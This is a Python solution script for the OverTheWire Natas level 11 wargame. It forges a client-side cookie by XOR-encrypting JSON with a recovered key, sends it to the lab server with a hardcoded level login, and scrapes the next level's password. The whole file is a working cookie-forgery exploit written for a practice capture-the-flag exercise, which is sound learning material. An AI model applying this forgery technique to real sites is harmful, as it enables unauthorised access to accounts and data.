import json
import base64
from urllib.parse import unquote
import requests
import re

goodstart = {"showpassword":"yes","bgcolor":"#ffffff"}
badstart = {"showpassword":"no","bgcolor":"#ffffff"}

# {"showpassword":"no","bgcolor":"#ffffff"}
# {"showpassword":"yes","bgcolor":"#ffffff"}

def jsonFormat(array):
    return json.dumps(array,separators=(",",":")) # seperators makes it so no spaces

goodresult  = "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMKMg%3D%3D"
badresult = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="


def padding(key,length):
    return (key * (length//len(key)+1))[:length]

def xor(data,key):
    code = ""
    padkey = len(data)
    keypad = padding(key,padkey)
    for i in range(len(data)):
        code = code + chr(ord(data[i]) ^ ord(keypad[i]))
    encode = code.encode("UTF-8")
    base = base64.b64encode(encode)
    return base.decode("UTF-8")


goodcookie = xor(jsonFormat(goodstart),"qw8J")

s = requests.Session()
s.auth = ("natas11","U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK")
game = s.get("http://natas11.natas.labs.overthewire.org", cookies={"data":goodcookie})
nextcode = re.findall('[a-zA-Z0-9]{32}',game.text)

print(nextcode[1])

 
